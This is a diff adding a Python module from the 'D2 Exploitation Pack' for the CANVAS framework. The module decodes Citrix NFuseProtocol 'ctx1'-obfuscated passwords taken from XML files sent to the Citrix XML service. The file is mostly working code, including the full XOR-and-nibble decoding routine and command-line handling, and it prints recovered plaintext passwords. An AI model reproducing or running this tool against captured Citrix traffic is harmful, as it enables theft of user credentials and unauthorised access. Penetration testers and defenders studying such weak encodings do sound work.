@@ -1,0 +1,143 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2011
+#
+
+import sys
+import re
+import random
+import time
+import thread
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from libs.spkproxy import header, body
+from libs.canvasos import *
+import libs.spkproxy as spkproxy
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "Citrix NFuseProtocol Password Decoder"
+DESCRIPTION = "Decode NFuseProtocol password in Citrix XML files sent to Citrix XML service"
+VERSION = "0.1"
+
+DOCUMENTATION = {}
+DOCUMENTATION["Notes"] = """
+You can find the ctx1 encoded password in the XML file.
+Ex.: <Password encoding="ctx1">OBBHMDBDNHAAMAEFLDHDLFGFLCHOKPHD</Password>
+"""
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Tool"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES = ""
+
+CHANGELOG = ""
+
+	
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.setInfo(DESCRIPTION)
+        self.name = NAME       		
+        self.encpwd = ""	
+        			
+        return
+
+
+    def f1(self, data):
+        ndata = ""
+        
+        for i in range(len(data)/2):                
+            al = ord(data[i*2])
+            dl = ord(data[(i*2)+1])    
+            
+            al = al-1
+            al = al<<4
+            al = al&0xff                
+            
+            dl = dl-1
+            dl = dl&0x0f                
+            
+            res = al|dl        
+            
+            ndata += chr(res)
+            
+        return ndata
+
+
+    def f2(self, data):
+        ndata = chr(ord(data[0])^0xa5)
+        first = ord(data[0])
+        data = data[1:]
+        
+        for i in range(len(data)):
+            a = ord(data[i])
+            res = a^first
+            res = res^0xa5
+            first = a
+            
+            ndata += "%c" % chr(res)
+            
+        return ndata
+
+            
+    def decode(self, data):
+        data1 = self.f1(data)
+        data2 = self.f2(data1)
+        
+        return data2
+
+
+    def hex2str(self, data):
+        tmp = ""
+        
+        for c in data:
+            tmp += "\\x%02x" % ord(c)
+        
+        return tmp
+   	    
+               
+    def run(self):
+        # Init	   
+        decpwd = ""
+		
+        # Check arguments
+        self.encpwd = self.argsDict.get("encpwd", self.encpwd)
+			
+        # Decode password
+        try:
+            decpwd = self.decode(self.encpwd)
+        except:
+            self.log("[D2] Error in the encoded password format")
+
+        try:                        		                                            
+            self.log("[D2] ENCODED PASSWORD: %s" % self.encpwd)
+            self.log("[D2] DECODED PASSWORD (ASCII): %s" % decpwd)
+        except UnicodeDecodeError:
+            self.log("[D2] DECODED PASSWORD (HEXA): %s" % self.hex2str(decpwd))                    
+						            
+        return 1            
+       
+			  		
+    def usage(self):        
+        print "Usage: %s [-O encpwd:encoded_password]\n" % sys.argv[0]					
+        sys.exit(0) 
+
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
